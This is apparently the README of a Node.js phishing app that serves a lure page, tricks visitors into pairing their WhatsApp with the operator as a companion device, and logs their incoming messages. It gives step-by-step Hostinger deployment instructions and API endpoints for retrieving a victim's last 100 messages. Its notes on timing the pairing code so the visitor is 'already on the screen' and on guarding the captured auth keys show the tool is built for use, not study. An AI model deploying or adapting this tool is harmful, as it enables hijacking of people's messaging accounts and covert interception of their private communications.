# scholar-alerts

Single Node app. Serves a lure page, links a visitor's WhatsApp as a companion
device, redirects them into a community, and logs incoming messages.

## Local

    npm install
    Copy-Item .env.example .env
    node --env-file=.env server.js
    start http://localhost:3000

## Hostinger

1. hPanel -> Websites -> Add website -> Node.js Web App
2. Build source: upload scholar-alerts.zip
3. Node 22 LTS, entry file server.js, build command npm install
4. Add env vars: COMMUNITY_URL (required), BRAND, TITLE, SUB
5. Deploy, attach domain, enable SSL
6. Cron: GET https://yourdomain.com/health every 5 min (keeps the process warm)

## Endpoints

    POST /api/start   {number} -> {code} | {linked}
    GET  /api/status  ?number= -> {linked}
    GET  /api/messages ?number= -> last 100 logged messages
    GET  /health

## Notes

- The app runs on demand on Hostinger: it sleeps when idle, wakes on the next
  request. Page polling keeps it warm during the pairing flow. Messages that
  arrive while asleep are replayed by WhatsApp on reconnect.
- Never commit sessions/ - it holds the WhatsApp auth keys.
- Pairing codes expire in ~60-100s, which is why the code is generated only
  after the visitor is already on the screen.